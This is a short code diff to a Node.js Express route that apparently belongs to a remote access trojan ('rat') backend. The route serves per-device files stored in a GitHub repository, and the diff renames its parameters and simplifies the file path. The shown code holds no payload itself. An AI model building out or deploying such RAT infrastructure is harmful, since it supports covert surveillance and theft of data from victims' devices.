@@ -1,16 +1,16 @@
- module.exports = function(app) {
+module.exports = function(app) {
     const axios = require('axios');
     const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
     const GITHUB_USER = 'daffaadev';
     const GITHUB_REPO = 'api';
 
-    app.get('/api/rat/:token/devices/:deviceId/:file', async (req, res) => {
+    app.get('/api/rat/:token/:device/:file', async (req, res) => {
         res.setHeader('Access-Control-Allow-Origin', '*');
 
         try {
-            const { token, deviceId, file } = req.params;
+            const { token, device, file } = req.params;
 
-            if (!token || !deviceId || !file) {
+            if (!token || !device || !file) {
                 return res.status(400).json({
                     success: false,
                     message: 'Invalid parameters.'
@@ -24,8 +24,7 @@
                 });
             }
 
-            // deviceId sekarang = model HP
-            const filePath = `device/${token}/devices/${deviceId}/${file}`;
+            const filePath = `device/${token}/${device}/${file}`;
 
             let fileContent = null;
             try {
